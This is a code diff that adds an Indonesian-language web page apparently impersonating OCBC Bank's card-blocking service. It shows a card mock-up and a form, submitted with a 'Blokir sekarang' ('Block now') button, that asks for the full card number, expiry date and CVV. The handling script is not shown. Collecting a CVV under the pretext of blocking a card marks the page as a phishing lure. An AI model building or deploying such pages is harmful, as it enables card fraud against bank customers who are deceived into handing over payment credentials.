@@ -1,1 +1,64 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blokir Kartu - OCBC Bank</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
 
+<div class="container">
+  <!-- Kartu OCBC Bank — Bisa Berbalik -->
+  <div class="card-preview">
+    <div class="card-inner" id="cardInner">
+      <!-- DEPAN KARTU -->
+      <div class="ocbc-card card-front">
+        <div class="card-top">
+          <div class="ocbc-logo">
+            <span class="logo-circle"></span>
+            <span class="ocbc-text">OCBC Bank</span>
+          </div>
+          <div class="visa-logo">VISA</div>
+        </div>
+        <div class="card-chip"></div>
+        <div class="card-labels">Nomor Kartu</div>
+        <div class="card-number-display" id="cardNumberPreview">#### #### #### ####</div>
+        <div class="card-valid-label">Valid Thru</div>
+        <div class="card-valid-display" id="cardValidPreview">##/##</div>
+      </div>
+
+      <!-- BELAKANG KARTU -->
+      <div class="ocbc-card card-back">
+        <div class="magnetic-strip"></div>
+        <div class="cvv-area">
+          <div class="cvv-label">CVV / CVC</div>
+          <div class="cvv-box" id="cardCvvDisplay">###</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Form Input -->
+  <div class="form-wrapper">
+    <form id="blockForm">
+      <div class="input-group">
+        <input type="tel" name="nomor_kartu" id="nomor_kartu" placeholder="Masukkan 16 digit Nomor kartu" maxlength="19" required inputmode="numeric">
+      </div>
+      <div class="input-row">
+        <div class="input-group half">
+          <input type="text" name="valid_thru" id="valid_thru" placeholder="Valid Thru" maxlength="5" required inputmode="numeric">
+        </div>
+        <div class="input-group half">
+          <!-- CVV: type=password (tersembunyi) + inputmode=numeric (keyboard angka) + pattern (hanya angka) -->
+          <input type="password" name="cvv" id="cvv" placeholder="CVV ( 3 Angka )" maxlength="3" required inputmode="numeric" pattern="[0-9]*" title="Hanya boleh angka 0-9">
+        </div>
+      </div>
+      <button type="submit" class="submit-btn">Blokir sekarang</button>
+    </form>
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
